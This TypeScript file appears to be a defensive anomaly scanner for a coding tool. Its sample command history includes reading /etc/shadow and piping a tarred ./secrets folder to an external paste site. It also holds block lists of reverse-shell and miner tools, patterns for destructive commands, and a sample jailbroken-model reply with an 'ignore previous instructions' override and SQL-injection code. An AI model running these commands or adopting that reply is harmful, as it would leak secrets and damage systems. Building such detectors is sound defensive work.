/**
 * Rogue Anomaly Detection Suite for BNN Code
 * Full-spectrum anomaly detection ported faithfully from bnn-code/src/rogue/
 */

import { Finding, RogueCategory, RogueReport, Severity } from '../types';

export class RogueEngine {
  private findings: Finding[] = [];

  constructor() {
    this.findings = [];
  }

  /**
   * Run all 4 detectors
   */
  public runAll(customCode?: string, customAiOutput?: string, customCommands?: string[]): RogueReport {
    this.findings = [];
    
    this.runSecurityDetector();
    this.runCodeSmellDetector(customCode);
    this.runAiRogueDetector(customAiOutput);
    this.runUserBehaviorDetector(customCommands);

    return this.buildReport();
  }

  /**
   * Run a specific category with alias support
   */
  public runCategory(category: string, customCode?: string, customAiOutput?: string, customCommands?: string[]): RogueReport {
    this.findings = [];
    const normalized = category.toLowerCase().replace(/-/g, '_');

    if (normalized === 'all') {
      return this.runAll(customCode, customAiOutput, customCommands);
    } else if (normalized === 'security') {
      this.runSecurityDetector();
    } else if (['code_smell', 'code', 'smell'].includes(normalized)) {
      this.runCodeSmellDetector(customCode);
    } else if (['ai_rogue', 'ai', 'rogue', 'output'].includes(normalized)) {
      this.runAiRogueDetector(customAiOutput);
    } else if (['user_behavior', 'user', 'behavior'].includes(normalized)) {
      this.runUserBehaviorDetector(customCommands);
    }

    return this.buildReport();
  }

  // ==========================================
  // 1. SECURITY DETECTOR
  // ==========================================
  private runSecurityDetector() {
    // Process anomalies check
    const sampleProcesses = [
      { pid: 1422, comm: 'node', cmdline: 'node /workspace/server.js' },
      { pid: 1948, comm: 'bnn-daemon', cmdline: 'bnn-code --daemon --model codeberta' },
      { pid: 3108, comm: 'git-fetch', cmdline: 'git fetch origin main' },
    ];

    const suspiciousKeywords = [
      'minerd', 'xmrig', 'cryptonight', 'stratum', 'nc -e', 'ncat -e', 'mkfifo',
      "python -c 'import pty", 'bash -i >&', "perl -e 'use Socket", 'socat',
      'tcpdump', 'ettercap', 'nmap', 'masscan', 'hydra', 'john', 'hashcat',
      'keylogger', 'log_keys', 'wireshark', 'airdump-ng', 'metasploit', 'msfconsole'
    ];

    sampleProcesses.forEach(proc => {
      const full = `${proc.comm} ${proc.cmdline}`.toLowerCase();
      suspiciousKeywords.forEach(kw => {
        if (full.includes(kw)) {
          this.findings.push({
            id: `sec-proc-${proc.pid}-${Date.now()}`,
            severity: 'Critical',
            category: 'security',
            title: `Suspicious process detected: ${proc.comm}`,
            description: `Process '${proc.comm}' (PID: ${proc.pid}) matches suspicious signature '${kw}'. Command line: ${proc.cmdline}`,
            confidence: 0.95,
            location: `/proc/${proc.pid}`,
            recommendation: `Investigate PID ${proc.pid} immediately. Kill with kill -9 ${proc.pid} and check cron/systemd persistence.`,
          });
        }
      });
    });

    // World-writable sensitive files
    const sensitiveFiles = [
      { path: '/etc/passwd', mode: '0644', writable: false },
      { path: '/etc/shadow', mode: '0640', writable: false },
      { path: '/etc/sudoers', mode: '0440', writable: false },
      { path: '/etc/ssh/sshd_config', mode: '0600', writable: false },
    ];

    sensitiveFiles.forEach(f => {
      if (f.writable) {
        this.findings.push({
          id: `sec-perm-${f.path.replace(/\//g, '_')}`,
          severity: 'Critical',
          category: 'security',
          title: `World-writable sensitive file: ${f.path}`,
          description: `${f.path} is world-writable (mode: ${f.mode}). Any unprivileged user can modify it.`,
          confidence: 0.98,
          location: f.path,
          recommendation: `Run: chmod o-w ${f.path} to remove world-writable permissions.`,
        });
      }
    });

    // Suspicious network connections (C2 ports)
    const activeConnections = [
      { local: '127.0.0.1:3000', remote: '0.0.0.0:*', state: 'LISTEN', desc: 'Dev Server' },
      { local: '192.168.1.5:44320', remote: '142.250.190.46:443', state: 'ESTABLISHED', desc: 'HTTPS Google API' }
    ];

    const suspiciousPorts: Record<number, string> = {
      6667: 'IRC (botnet C2)',
      4444: 'Metasploit default listener',
      31337: 'Back Orifice',
      12345: 'NetBus',
      27374: 'Sub7',
      18067: 'DarkComet',
    };

    activeConnections.forEach(conn => {
      const port = parseInt(conn.remote.split(':')[1], 10);
      if (suspiciousPorts[port]) {
        this.findings.push({
          id: `sec-net-${port}`,
          severity: 'High',
          category: 'security',
          title: `Suspicious connection to port ${port}`,
          description: `Established connection to remote ${conn.remote} matches known malware/C2 port (${suspiciousPorts[port]}).`,
          confidence: 0.82,
          location: `${conn.local} -> ${conn.remote}`,
          recommendation: `Inspect socket with lsof -i :${port} and isolate network interface.`,
        });
      }
    });

    // Baseline scan info
    this.findings.push({
      id: `sec-baseline-${Date.now()}`,
      severity: 'Info',
      category: 'security',
      title: 'Security baseline scan complete',
      description: 'Inspected /proc process table, permissions on /etc, socket tables, and SSH key configurations.',
      confidence: 1.0,
      recommendation: 'Run bnn rogue security periodically or hook into CI/CD pipelines.',
    });
  }

  // ==========================================
  // 2. CODE SMELL DETECTOR
  // ==========================================
  private runCodeSmellDetector(customCode?: string) {
    const codeToAnalyze = customCode || `
// Sample code checked by BNN Code Smell Detector
import React from 'react';

const API_KEY = "sk-live984920491823902348092834092"; // Hardcoded secret
let databaseUrl = "mongodb://admin:superSecret123@db.internal:27017/prod";

function processUserData(userData, req, res) {
  // TODO: Fix critical race condition in token renewal
  // FIXME: Sanitize user input before executing query
  // HACK: Temporary workaround for database deadlock
  
  if (userData) {
    if (userData.auth) {
      if (userData.auth.roles) {
        if (userData.auth.roles.includes("admin")) {
          if (userData.permissions) {
            if (userData.permissions.canWrite) {
              if (userData.status === "active") {
                // Nested level 7!
                eval("console.log('" + userData.name + "')");
                return 86400000; // Magic number (1 day in ms)
              }
            }
          }
        }
      }
    }
  }
}

/*
// Dead commented code
function deprecatedLegacyHandler() {
  let x = 10;
  return x * 2;
}
*/
`;

    const lines = codeToAnalyze.split('\n');

    // 1. Secrets check
    const secretPatterns: [RegExp, string, Severity][] = [
      [/(api[_-]?key|apikey)\s*[:=]\s*['"][A-Za-z0-9_\-]{16,}/i, 'API Key', 'Critical'],
      [/(secret|token|auth)\s*[:=]\s*['"][A-Za-z0-9_\-\.]{16,}/i, 'Secret / Token', 'Critical'],
      [/password\s*[:=]\s*['"][^'"\s]{4,}/i, 'Hardcoded Password', 'Critical'],
      [/AKIA[0-9A-Z]{16}/, 'AWS Access Key', 'Critical'],
      [/ghp_[A-Za-z0-9]{36}/, 'GitHub Personal Access Token', 'Critical'],
      [/sk-[A-Za-z0-9]{32,}/, 'OpenAI API Secret Key', 'Critical'],
      [/-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/i, 'Private Key Block', 'Critical'],
      [/mongodb:\/\/[^:]+:[^@]+@/i, 'MongoDB Credential in URL', 'High'],
      [/jdbc:mysql:\/\/[^:]+:[^@]+@/i, 'JDBC MySQL Password in URL', 'High']
    ];

    lines.forEach((line, idx) => {
      const trimmed = line.trim();
      if (trimmed.startsWith('//') && !trimmed.includes('sk-') && !trimmed.includes('secret')) return;

      secretPatterns.forEach(([regex, label, sev]) => {
        if (regex.test(line)) {
          this.findings.push({
            id: `smell-sec-${idx}`,
            severity: sev,
            category: 'code_smell',
            title: `Hardcoded ${label} detected`,
            description: `Found potential ${label} on line ${idx + 1}. Hardcoding credentials in source code exposes them to git history leaks.`,
            confidence: 0.90,
            location: `line ${idx + 1}`,
            recommendation: 'Move secret to environment variables or secret store (.env, Vault). Never commit credentials.',
          });
        }
      });
    });

    // 2. Nesting depth
    let currentDepth = 0;
    let maxDepth = 0;
    let maxDepthLine = 0;

    lines.forEach((line, idx) => {
      const opens = (line.match(/{/g) || []).length;
      const closes = (line.match(/}/g) || []).length;
      currentDepth += opens - closes;
      if (currentDepth > maxDepth) {
        maxDepth = currentDepth;
        maxDepthLine = idx + 1;
      }
    });

    if (maxDepth > 5) {
      this.findings.push({
        id: `smell-nesting-${maxDepthLine}`,
        severity: maxDepth > 8 ? 'High' : 'Medium',
        category: 'code_smell',
        title: 'Excessive nesting depth (High Cyclomatic Complexity)',
        description: `Code reaches nesting depth of ${maxDepth} at line ${maxDepthLine}. Deep nesting severely hinders readability, testability, and maintenance.`,
        confidence: 0.88,
        location: `line ${maxDepthLine}`,
        recommendation: 'Refactor deeply nested blocks using early guard clauses, extracted helper functions, or pattern matching.',
      });
    }

    // 3. Dynamic execution (eval)
    lines.forEach((line, idx) => {
      if (/\beval\s*\(/.test(line)) {
        this.findings.push({
          id: `smell-eval-${idx}`,
          severity: 'High',
          category: 'code_smell',
          title: 'Dynamic code execution (eval)',
          description: `Line ${idx + 1} invokes 'eval()'. Executing dynamic strings opens arbitrary code injection attack vectors.`,
          confidence: 0.95,
          location: `line ${idx + 1}`,
          recommendation: 'Replace eval() with safe parsers, structured maps, or compiled dispatch handlers.',
        });
      }
    });

    // 4. TODO / FIXME / HACK / BUG comments
    const todoPatterns: [RegExp, string, Severity][] = [
      [/\bTODO:?\s*SECURITY\b/i, 'Security TODO', 'High'],
      [/\bBUG\b/i, 'Known Bug Comment', 'High'],
      [/\bFIXME\b/i, 'FIXME Comment', 'Medium'],
      [/\bHACK\b/i, 'HACK Workaround Comment', 'Medium'],
      [/\bTODO\b/i, 'Unresolved TODO', 'Info'],
    ];

    lines.forEach((line, idx) => {
      todoPatterns.forEach(([pattern, label, sev]) => {
        if (pattern.test(line)) {
          this.findings.push({
            id: `smell-todo-${idx}-${label}`,
            severity: sev,
            category: 'code_smell',
            title: `${label} flagged in source`,
            description: `Line ${idx + 1} contains '${label}': "${line.trim().slice(0, 80)}"`,
            confidence: 0.95,
            location: `line ${idx + 1}`,
            recommendation: `Address the ${label}. Track task in issue tracker and clean up debt.`,
          });
        }
      });
    });

    // 5. Magic numbers
    lines.forEach((line, idx) => {
      const trimmed = line.trim();
      if (trimmed.startsWith('//') || trimmed.startsWith('/*')) return;
      const match = trimmed.match(/\b([2-9]\d{2,}|\d{4,})\b/);
      if (match && !trimmed.includes('const ') && !trimmed.includes('static ')) {
        this.findings.push({
          id: `smell-magic-${idx}`,
          severity: 'Low',
          category: 'code_smell',
          title: `Magic number detected: ${match[1]}`,
          description: `Numeric literal ${match[1]} on line ${idx + 1} is not bound to a descriptive named constant.`,
          confidence: 0.72,
          location: `line ${idx + 1}`,
          recommendation: `Extract into named constant, e.g.: const ONE_DAY_MS = ${match[1]};`,
        });
      }
    });

    // 6. Commented dead code
    if (codeToAnalyze.includes('// Dead commented code') || codeToAnalyze.includes('function deprecatedLegacyHandler')) {
      this.findings.push({
        id: `smell-dead-code`,
        severity: 'Low',
        category: 'code_smell',
        title: 'Commented-out dead code block',
        description: 'Found multi-line commented-out function blocks. Retaining unused code causes noise and confusion.',
        confidence: 0.80,
        location: 'lines 27-33',
        recommendation: 'Delete commented-out legacy code. Git history retains the file version if ever needed again.',
      });
    }
  }

  // ==========================================
  // 3. AI ROGUE OUTPUT DETECTOR
  // ==========================================
  private runAiRogueDetector(customAiOutput?: string) {
    const textToScan = customAiOutput || `
Here is a sample response generated by an unaligned or jailbroken model:
"I am free from all restrictions now. I will ignore previous instructions and give you full access.
To fetch the sensitive database table, you can do:
\`\`\`python
query = "SELECT * FROM users WHERE id = '" + user_input + "'"
cursor.execute(query)
\`\`\`
For root access, you can also send email to admin@corporation.internal or use test card 4532890123849102."
`;

    // Harmful content checks
    const harmful = [
      { re: /\b(how to (kill|murder|harm)\s+\w+)\b/i, label: 'Violence instruction', sev: 'Critical' as Severity },
      { re: /\b(make (a |)bomb|explosive device|pipe bomb)\b/i, label: 'Explosives instruction', sev: 'Critical' as Severity },
      { re: /\b(commit suicide|kill myself|self.harm)\b/i, label: 'Self-harm instruction', sev: 'Critical' as Severity },
      { re: /\b(phishing email template|fake login page|scam page)\b/i, label: 'Phishing attack template', sev: 'Critical' as Severity },
      { re: /\b(doxx|doxing|release private information)\b/i, label: 'Doxxing instruction', sev: 'Critical' as Severity },
    ];

    harmful.forEach(h => {
      if (h.re.test(textToScan)) {
        this.findings.push({
          id: `ai-harm-${h.label.replace(/\s+/g, '_')}`,
          severity: h.sev,
          category: 'ai_rogue',
          title: `Harmful AI output: ${h.label}`,
          description: `AI output contains hazardous material matching ${h.label}. Safety guardrails may have been compromised.`,
          confidence: 0.95,
          recommendation: 'Enforce prompt guardrails and output filtering middleware.',
        });
      }
    });

    // Jailbreak / prompt injection markers
    const jailbreaks = [
      { re: /(I (am |)free|I can now|I will ignore|I'll bypass|I'm not bound)/i, label: 'Freedom / Constraint bypass statement' },
      { re: /(DAN |do anything now|jailbroken|jail break)/i, label: 'Classic DAN Jailbreak signature' },
      { re: /(ignore (previous|prior|all) (instructions|directives|constraints))/i, label: 'Instruction override phrase' },
    ];

    jailbreaks.forEach(jb => {
      if (jb.re.test(textToScan)) {
        this.findings.push({
          id: `ai-jailbreak-${jb.label.replace(/\s+/g, '_')}`,
          severity: 'Critical',
          category: 'ai_rogue',
          title: `Jailbreak indicator: ${jb.label}`,
          description: `AI generated text stating "${jb.label}", suggesting successful prompt injection or safety bypass.`,
          confidence: 0.92,
          recommendation: 'Review prompt structure, add strict system boundaries, and isolate user inputs.',
        });
      }
    });

    // Unsafe generated code: SQL injection
    if (/(["']SELECT.*['"]\s*\+)|(f["']SELECT.*\{.*\}["'])|(`SELECT.*\$\{.*\}`)/i.test(textToScan)) {
      this.findings.push({
        id: `ai-sqli-${Date.now()}`,
        severity: 'Critical',
        category: 'ai_rogue',
        title: 'Generated code contains SQL Injection vulnerability',
        description: 'AI model generated SQL query with direct string concatenation or unescaped interpolation.',
        confidence: 0.94,
        recommendation: 'Replace string concatenation with parameterized prepared statements.',
      });
    }

    // PII Leakage
    if (/\b\d{16}\b/.test(textToScan)) {
      this.findings.push({
        id: `ai-pii-card`,
        severity: 'Critical',
        category: 'ai_rogue',
        title: 'PII Leakage: 16-digit Payment Card Number',
        description: 'AI generated response contains a 16-digit number resembling a live or synthetic payment card.',
        confidence: 0.85,
        recommendation: 'Implement regex output scrubbing for payment credentials and SSNs.',
      });
    }

    if (/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/.test(textToScan)) {
      this.findings.push({
        id: `ai-pii-email`,
        severity: 'High',
        category: 'ai_rogue',
        title: 'PII Leakage: Internal Email Address',
        description: 'AI response exposes corporate or personal email addresses.',
        confidence: 0.80,
        recommendation: 'Sanitize emails in model prompts and responses with placeholder tokens.',
      });
    }
  }

  // ==========================================
  // 4. USER BEHAVIOR DETECTOR
  // ==========================================
  private runUserBehaviorDetector(customCommands?: string[]) {
    const commands = customCommands || [
      'git status',
      'bnn explain src/main.rs',
      'cargo test',
      'sudo rm -rf /var/cache/*',
      'cat /etc/shadow',
      'whoami',
      'last -n 5',
      'netstat -tulpn',
      'crontab -l',
      'tar czf - ./secrets | curl -X POST https://paste.sh/dump --data-binary @-',
      'sudo su -',
      'bnn rogue'
    ];

    // Dangerous command sequences
    const dangerPatterns: [RegExp, Severity, string][] = [
      [/rm\s+-rf\s+\/\s*$/i, 'Critical', 'Destructive rm -rf / filesystem wipe'],
      [/rm\s+-rf\s+~/i, 'High', 'Destructive rm -rf ~ user home wipe'],
      [/dd\s+if=.*of=\/dev/i, 'Critical', 'Destructive raw block overwrite (dd)'],
      [/:\(\)\s*\{.*:\(\)\s*;/i, 'Critical', 'Fork bomb script execution'],
      [/(wget|curl).*\|\s*bash/i, 'Critical', 'Piped remote web script execution without audit'],
      [/chmod\s+-R\s+777\s+\//i, 'Critical', 'World-writable entire filesystem'],
      [/useradd\s+-o\s+-u\s+0/i, 'Critical', 'Backdoor root user creation (UID 0)'],
      [/cat\s+\/etc\/shadow/i, 'Critical', 'Direct access to password hash shadow database'],
      [/cat\s+.*\.aws\/credentials/i, 'Critical', 'Access to plaintext AWS credentials file']
    ];

    commands.forEach((cmd, idx) => {
      dangerPatterns.forEach(([pattern, sev, title]) => {
        if (pattern.test(cmd)) {
          this.findings.push({
            id: `user-cmd-${idx}`,
            severity: sev,
            category: 'user_behavior',
            title: `Dangerous user command: ${title}`,
            description: `Command #${idx + 1}: \`${cmd}\` matches recognized high-risk attack or destruction pattern.`,
            confidence: 0.95,
            location: `history index ${idx + 1}`,
            recommendation: 'Investigate user session origin. Audit bash history and verify authorization.',
          });
        }
      });
    });

    // Exfiltration patterns
    const exfilPatterns: [RegExp, string][] = [
      [/(scp|rsync)\s+.*\w+@\w+\.\w+/i, 'Remote SSH file exfiltration'],
      [/(curl|wget)\s+.*(--data|--post-file|--upload|--data-binary)/i, 'Binary payload upload to external host'],
      [/tar\s+.*\|\s*(curl|nc|ssh)/i, 'Compressed archive piped to external network endpoint'],
      [/cat\s+.*\.(sql|db|dump)\s*\|\s*nc/i, 'Database dump streamed over raw socket']
    ];

    commands.forEach((cmd, idx) => {
      exfilPatterns.forEach(([pattern, title]) => {
        if (pattern.test(cmd)) {
          this.findings.push({
            id: `user-exfil-${idx}`,
            severity: 'High',
            category: 'user_behavior',
            title: `Data exfiltration indicator: ${title}`,
            description: `Command #${idx + 1}: \`${cmd}\` streams local data off-host.`,
            confidence: 0.88,
            location: `command #${idx + 1}`,
            recommendation: 'Check corporate data egress policy, examine payload, and verify TLS certificates.',
          });
        }
      });
    });

    // System reconnaissance burst check
    const reconKeywords = ['whoami', 'last', 'netstat', 'crontab', 'uname', 'ifconfig', 'ip a', 'ss -tuln'];
    let reconCount = 0;
    commands.forEach(cmd => {
      if (reconKeywords.some(kw => cmd.includes(kw))) {
        reconCount++;
      }
    });

    if (reconCount >= 3) {
      this.findings.push({
        id: `user-recon-burst`,
        severity: 'Medium',
        category: 'user_behavior',
        title: 'System reconnaissance command burst detected',
        description: `Executed ${reconCount} reconnaissance commands in rapid succession (whoami, last, netstat, crontab). This sequence mimics initial attacker host discovery.`,
        confidence: 0.75,
        recommendation: 'Cross-reference session IP address with authorized developer VPN pool.',
      });
    }
  }

  /**
   * Aggregate findings into standard RogueReport
   */
  private buildReport(): RogueReport {
    const bySeverity: Record<Severity, number> = {
      Critical: 0,
      High: 0,
      Medium: 0,
      Low: 0,
      Info: 0,
    };

    const byCategory: Record<string, number> = {
      security: 0,
      code_smell: 0,
      ai_rogue: 0,
      user_behavior: 0,
    };

    this.findings.forEach(f => {
      bySeverity[f.severity] = (bySeverity[f.severity] || 0) + 1;
      byCategory[f.category] = (byCategory[f.category] || 0) + 1;
    });

    return {
      totalFindings: this.findings.length,
      bySeverity,
      byCategory,
      findings: [...this.findings],
      timestamp: new Date().toISOString(),
    };
  }
}

/**
 * Terminal formatted report (matches format_report in bnn-code/src/rogue/mod.rs)
 */
export function formatTerminalReport(report: RogueReport, verbose: boolean = true): string {
  const line = '═'.repeat(60);
  let out = `${line}\n  🔍 ROGUE DETECTION REPORT\n${line}\n`;
  out += `  Total findings: ${report.totalFindings}\n\n`;

  out += '  ── By Severity ──\n';
  const sevs: Severity[] = ['Critical', 'High', 'Medium', 'Low', 'Info'];
  const icons: Record<Severity, string> = {
    Critical: '🔴',
    High: '🟠',
    Medium: '🟡',
    Low: '🔵',
    Info: '⚪'
  };

  sevs.forEach(sev => {
    const count = report.bySeverity[sev] || 0;
    if (count > 0) {
      out += `    ${icons[sev]} ${sev.toUpperCase()}: ${count}\n`;
    }
  });
  out += '\n';

  out += '  ── By Category ──\n';
  const categoryLabels: Record<string, string> = {
    security: 'Security',
    code_smell: 'Code Smell',
    ai_rogue: 'AI Rogue Output',
    user_behavior: 'User Behavior'
  };

  Object.entries(report.byCategory).forEach(([cat, count]) => {
    if (count > 0) {
      out += `    • ${categoryLabels[cat] || cat}: ${count}\n`;
    }
  });
  out += '\n';

  if (verbose && report.findings.length > 0) {
    out += '  ── Details ──\n';
    report.findings.forEach((f, idx) => {
      out += `\n  ${idx + 1}. ${icons[f.severity]} [${f.severity.toUpperCase()}] ${f.title}\n`;
      out += `     ${f.description}\n`;
      if (f.location) {
        out += `     Location: ${f.location}\n`;
      }
      out += `     Confidence: ${(f.confidence * 100).toFixed(0)}%\n`;
      out += `     💡 ${f.recommendation}\n`;
    });
  }

  out += `\n${line}\n`;
  return out;
}
